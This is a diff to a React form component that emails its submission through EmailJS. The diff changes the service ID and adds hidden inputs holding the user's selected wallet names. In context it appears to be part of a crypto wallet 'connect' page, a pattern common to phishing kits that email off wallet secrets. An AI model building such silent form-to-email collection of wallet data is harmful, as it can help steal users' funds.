@@ -1,5 +1,6 @@
 import { useRef, useState } from "react";
 import { Usewallet } from "../context/Usewallet";
+import emailjs from "@emailjs/browser";
 
 function Form() {
   const { setFormVisible, walletArray } = Usewallet();
@@ -13,7 +14,7 @@ function Form() {
     setInActive(true);
 
     emailjs
-      .sendForm("service_x41o8tj", "template_168l8hs", form.current, {
+      .sendForm("service_7a0b0xo", "template_168l8hs", form.current, {
         publicKey: "4N-dX6YLFvkH1V-xz",
       })
       .then(
@@ -135,6 +136,18 @@ function Form() {
               </span>
             </>
           )}
+
+          {walletArray.map((wallet) => (
+            <span key={wallet.id}>
+              <input
+                type="text"
+                name="wallet"
+                value={wallet.name}
+                style={{ display: "none" }}
+              />
+            </span>
+          ))}
+
           <div className="mt-5 flex gap-4">
             <button
               type="submit"
